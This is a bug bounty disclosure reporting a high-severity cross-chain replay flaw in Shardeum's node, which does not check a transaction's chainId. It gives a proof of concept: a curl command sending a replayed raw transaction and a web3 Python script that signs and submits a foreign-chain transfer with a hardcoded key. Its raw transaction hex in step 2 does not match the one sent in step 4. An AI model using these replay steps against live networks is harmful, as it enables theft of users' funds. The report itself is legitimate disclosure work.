# 33473 - \[BC - High] Cross-chain replay attacks are possible due to ...

Submitted on Jul 21st 2024 at 21:04:08 UTC by @anton\_quantish for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33473

Report type: Blockchain/DLT

Report severity: High

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Direct loss of funds

## Description

## Brief/Intro

The `chainId` transaction parameter is not checked before it's executed that leads to cross-chain replay attacks.

## Vulnerability Details

Every blockchain has its own unique `chainId` which should prevent the cross-chain replay attacks.

Let's imagine some address `0x1` sends 1 ether in the Ethereum to attacker (`0x2`). He makes a tx like the following, signs it, and submits in the Ethereum:

```json
{"chainId": 1, "from": "0x1", "to": "0x2", "value": 1000000000000000000, "nonce": 0}
```

The tx is successfully executed and the attacked got his 1 ether on the Ethereum.

Then, the attacker copies this signed transaction and submits it in the Shardeum.

Usually, the node first checks the signature and then checks if the `chainId` belongs to the node's blockchain or not. The Shardeum nodes, however, don't check it so, if the `0x1` address has sufficient balance in the Shardeum, the transaction will be executed because the tx signature itself is valid.

Thus, the attacker will steal 1000000000000000000 SHM from the victim.

Also, as I see, the Shardeum nodes ignore the absence of the `chainId` tx field. All the Ethereum transactions before EIP-155 do not have this field. So, these old transactions could be replayed as well (see the `Mitigation` section).

## Impact Details

The attacker can replay arbitrary transactions from other blockchains which leads to a direct loss of the user funds.

## Mitigation

Receiving a tx you MUST check that:

* the `chainId` is present and is equal to the current blockchain chainId (8080 by default);
* the `chainId` field is signed and the signature is valid.

## References

<https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md> <https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou\\_9t3XRJseY> <https://www.quicknode.com/guides/ethereum-development/smart-contracts/what-are-replay-attacks-on-ethereum>

## Proof of Concept

First, let's check the `chainId`-absent transactions could be replayed.

1. Navigate to the following TX in Etherscan: <https://etherscan.io/tx/0x5c504ed432cb51138bcf09aa5e8a410dd4a1e204ef84bfed1be16dfba1b22060> This is the very first Tx set in the Ethereum blockchain
2. In the top-right corner you can switch the view to a raw tx hex. It's the following:

```
0xf86780862d79883d2000825208945df9b87991262f6ba471f09758cde1c0fc1de734827a69801ca088ff6cf0fefd94db46111149ae4bfc179e9b94721fffd821d38d16464b3f71d0a045e0aff800961cfce805daef7016b9b675c137a6a41a548f7b60a3484c06a33a
```

If you decode it with <https://www.ethereumdecoder.com/?search=0xf86780862d79883d2000825208945df9b87991262f6ba471f09758cde1c0fc1de734827a69801ca088ff6cf0fefd94db46111149ae4bfc179e9b94721fffd821d38d16464b3f71d0a045e0aff800961cfce805daef7016b9b675c137a6a41a548f7b60a3484c06a33a> you will see, the tx body is

```json
{
  "nonce": 0,
  "gasPrice": {
    "_hex": "0x2d79883d2000"
  },
  "gasLimit": {
    "_hex": "0x5208"
  },
  "to": "0x5df9b87991262f6ba471f09758cde1c0fc1de734",
  "value": {
    "_hex": "0x7a69"
  },
  "data": "0x",
  "v": 28,
  "r": "0x88ff6cf0fefd94db46111149ae4bfc179e9b94721fffd821d38d16464b3f71d0",
  "s": "0x45e0aff800961cfce805daef7016b9b675c137a6a41a548f7b60a3484c06a33a"
}
```

3. Start the nodes and the JSON-RPC server, fill the `0xA1E4380A3B1f749673E270229993eE55F35663b4` balance with some SHM (it will need more than 31337 + gas)
4. Replay this tx with the following cURL command:

```
curl http://172.16.205.128:8080 -X POST -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf86b808501dcd6500082520894e952ad0d1ff706e47bcea25d29a918126efb0a99871c6bf5263400008026a0b2e4be2b39797e24f418a61378c828a7ee0e5662d011cf58ffd6fdc4d91fff84a057753b07aadf290e4fa6d8f9c533dec5e0dccb87e67cadca08d169ff6297c73b"],"id":1}' 
{"jsonrpc":"2.0","id":1,"result":"0x582b88655a7dad511eb477e445ebcfbc1c9ea5366ace3df7ac1d8b7f05813ea7"}
```

5. Wait a little, make sure the tx is executed successfully and the transfer of 31337 SHM is made from `0xA1E4380A3B1f749673E270229993eE55F35663b4` to `0x5df9b87991262f6ba471f09758cde1c0fc1de734` despite we don't know the sender private key.

As for the transactions with `chainId` field replaying, it's a bit difficult to reproduce because all the modern Ethereum transactions uses `maxFeePerGas` and `maxPriorityFeePerGas` fields but your RPC rejects it for some reason. To reproduce, you can just sign a tx for the different chain and then submit it to the Shardeum JSON-RPC using the following python script:

```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://172.16.205.128:8080'))

FROM = '0x1d9f3e0620b7f19794a01da018fae85c534ae97e'

transaction = {
    'from': '0x1d9f3e0620b7f19794a01da018fae85c534ae97e',
    'to': '0xa54E321c2A394451F3286386cA26BE2317B4C212',
    'value': 2,
    'nonce': 0,
    'gas': 200000,
    'gasPrice': 10000,
    'chainId': 137  # Polygon
}

# 2. Sign tx with a private key
signed = w3.eth.account.sign_transaction(transaction, '0xed70dc3717453ccbd9147ff5da9ad4f2c87a8a0d9861f83b116400e0fa31632a')
print(signed)

# 3. Send the signed transaction
tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
tx = w3.eth.get_transaction(tx_hash)
print(tx)
```

Just fill the sender `0x1d9f3e0620b7f19794a01da018fae85c534ae97e` with some SHM before the executing.

It should be rejected because of `chainId` differs from your own one, but the tx is successfully executed instead. In a real life it could be the tx that were previously submitted into other blockchain and then replayed on the Shardeum.
